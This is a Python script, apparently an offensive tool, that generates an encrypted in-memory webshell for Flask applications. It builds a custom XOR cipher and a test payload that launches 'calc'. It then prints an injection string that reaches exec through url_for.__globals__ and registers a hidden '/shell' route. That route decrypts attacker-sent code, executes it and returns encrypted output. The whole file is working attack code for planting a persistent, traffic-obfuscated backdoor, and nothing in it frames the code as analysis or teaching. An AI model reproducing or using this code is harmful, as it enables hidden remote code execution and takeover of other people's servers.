import base64
import hashlib
import random
class RandXor(object):
    """ 加解密 """
    def __init__(self, shell_password, salt='mewoshell'):
        self.shell_password = shell_password
        self.salt = salt
        self.key = self.generate_key()
        self.rkey = len(self.shell_password)

    def get_md5(self, data):
        md5 = hashlib.md5()
        md5.update(data.encode('utf-8'))
        return md5.hexdigest()
    def generate_key(self):
        """ 异或key """
        return hashlib.sha256(self.get_md5(self.shell_password)[8:24].encode()).digest()

    def encrypt(self, plaintext):
        plaintext = base64.b64decode(plaintext)
        ciphertext = bytearray(len(plaintext))
        random.seed(self.rkey)
        for i in range(len(plaintext)):
            ciphertext[i] = plaintext[i] ^ self.rkey
            ciphertext[i] = ciphertext[i] ^ (random.randint(1, len(plaintext)) & 0xff) ^ self.key[i % len(self.key)]
        ciphertext = base64.b64encode(ciphertext).decode('utf-8')
        return ciphertext

    def decrypt(self, ciphertext):
        ciphertext = base64.b64decode(ciphertext)
        plaintext = bytearray(len(ciphertext))
        random.seed(self.rkey)
        for i in range(len(ciphertext)):
            plaintext[i] = ciphertext[i] ^ (random.randint(1, len(ciphertext)) & 0xff) ^ self.key[i % len(self.key)]
            plaintext[i] = plaintext[i] ^ self.rkey
        plaintext = base64.b64encode(plaintext).decode('utf-8')
        return plaintext

payload = """
import os
resp = os.popen('calc')
"""
rx = RandXor('pass' , 'mewoshell')
print('password:', 'pass', rx.get_md5('pass'))
print('异或key（base64）:', base64.b64encode(rx.key).decode('utf-8'))
print('随机数种子:', rx.rkey)
payload = base64.b64encode(payload.encode('utf-8'))
encrypted = rx.encrypt(payload)
print('加密结果:', encrypted)
print('解密结果:', base64.b64decode(rx.decrypt(encrypted)).decode('utf-8'))

shell = f"""
def shell_func():
    import base64
    import random
    import urllib.request
    parma = {{'resp': 'Error', 'app': app, 'gl': ulg}}
    p_code = request.get_data(as_text=True)
    ciphertext = base64.b64decode(p_code)
    plaintext = bytearray(len(ciphertext))
    rkey = {str(rx.rkey)}
    key = base64.b64decode('{base64.b64encode(rx.key).decode('utf-8')}')
    random.seed(rkey)
    for i in range(len(ciphertext)):
        plaintext[i] = ciphertext[i] ^ (random.randint(1, len(ciphertext)) & 0xff) ^ key[i % len(key)]
        plaintext[i] = plaintext[i] ^ rkey
    exec(plaintext, parma)
    plaintext = str(parma['resp']).encode('utf-8')
    ciphertext = bytearray(len(plaintext))
    random.seed(rkey)
    for i in range(len(plaintext)):
        ciphertext[i] = plaintext[i] ^ rkey
        ciphertext[i] = ciphertext[i] ^ (random.randint(1, len(plaintext)) & 0xff) ^ key[i % len(key)]
    parma['resp'] = base64.b64encode(ciphertext).decode('utf-8')
    return str(parma['resp']+f'&key={{rx.key}}')
"""
output = f"""
url_for.__globals__['__builtins__']['exec'](
    "exec(__import__('base64').b64decode('{base64.b64encode(shell.encode('utf-8')).decode('utf-8')}'));app.view_functions['shell'] = shell_func;app._got_first_request=False;app.add_url_rule('/shell', 'shell', shell_func, methods=['POST','GET']);app._got_first_request=True;", 
    {{'request':url_for.__globals__['request'],'ulg': url_for.__globals__, 'app':url_for.__globals__['current_app']}}
)
"""
print(output)
